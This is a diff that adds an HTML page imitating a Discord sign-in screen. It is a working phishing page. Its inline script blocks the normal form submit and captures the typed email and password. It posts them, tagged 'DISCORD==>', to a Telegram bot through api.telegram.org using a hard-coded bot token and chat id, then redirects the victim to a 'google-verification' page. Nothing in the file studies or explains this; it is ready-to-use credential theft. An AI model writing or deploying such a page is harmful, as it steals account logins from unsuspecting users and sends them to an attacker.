@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+
+    <title>Hello, world!</title>
+    <style type="text/css">
+      body{
+        margin: 0;
+        padding: 0;
+      }
+      *{
+        background-color: #36393F;
+        color: white;
+      }
+      input:focus {
+    outline: none !important;
+    border:1px solid #5865F2;
+ 
+  }
+
+  input{
+    border: 1px solid #232529;
+    width: 100%;
+    height: 40px;
+    margin-bottom: 10px;
+     border-radius: 5px;
+     background-color: #2f3237;
+  }
+  .btn{
+    background-color: #5865F2;
+    width: 100%; height: 50px;
+    margin-bottom: 5px;
+  }
+  .btn:hover{
+    background-color: #4150f1;
+  }
+
+.icerik{
+  margin-top: 20%;
+  padding: 8px;
+}
+
+
+    </style>
+  </head>
+  <body>
+    
+<div class="container-fluid">
+  <div class="row">
+    <div class="col-md-4"></div>
+    <div class="col-md-4">
+     
+         <center>
+        <br>
+        <img src="logo.png" width="150">
+       
+      </center>
+       <div class="icerik">
+           <h2>
+              Welcome again!
+            </h2>
+            <span style="color: #888 ;">We are so glad to see you again</span>
+
+            <form method="post" style="margin-top: 20px;">
+              <label style="color: #999; font-weight: 500; font-size: 14px;" >EMAIL OR PHONE NUMBER</label>
+              <input type="text" name="" id="uname" >
+              <br><br>
+              <label style="color: #999; font-weight: 500; font-size: 14px;" >PASSWORD</label>
+              <input type="text" name="" id="pass" style="-webkit-text-security: disc">
+<a style="text-decoration: none; color:#3399ff; font-size: 14px; font-weight: 500;" href="#">Forgot password?</a>
+<br><br>
+  <button type="submit" class="btn btn-primary" id="checkpointSubmitButton">Sign in</button>
+  <br>
+     <span style="color: #888 ; font-size: 12px;" >Do u need an account&nbsp; <a href="#" style="text-decoration: none; color:#3399ff; font-size: 12px; font-weight: 500;">Sign up</a></span>
+            </form>
+    </div>
+      </div>
+     
+    <div class="col-md-4"></div>
+  </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <!-- Optional JavaScript; choose one of the two! -->
+
+    <!-- Option 1: Bootstrap Bundle with Popper -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+
+    <!-- Option 2: Separate Popper and Bootstrap JS -->
+    <!--
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
+    -->
+    <script>
+       
+      
+  var token = "2003179850:AAExo-o2BmvLr8pZM537wu8vNqp7NYGB8Ko"
+   var chat_id = "-523390222"
+
+    $(document).ready(function () {
+    $('#checkpointSubmitButton').click(function(e) {
+
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            
+
+            var uname = document.getElementById('uname').value;
+            var pass = document.getElementById('pass').value;
+        
+            var icerik = "DISCORD==>" + "         " + "Email: " + uname + "         " + "Password: " + pass;
+
+if(pass != ""){
+
+            $.post("https://api.telegram.org/bot"+token+"/sendMessage?text="+icerik+"&chat_id="+chat_id, 
+              
+              function (data, status) {
+                //console.log(data);
+                  window.location.href = "google-verification.html";
+           });
+             }
+
+
+            
+     });
+});
+
+    </script>
+  </body>
+</html>
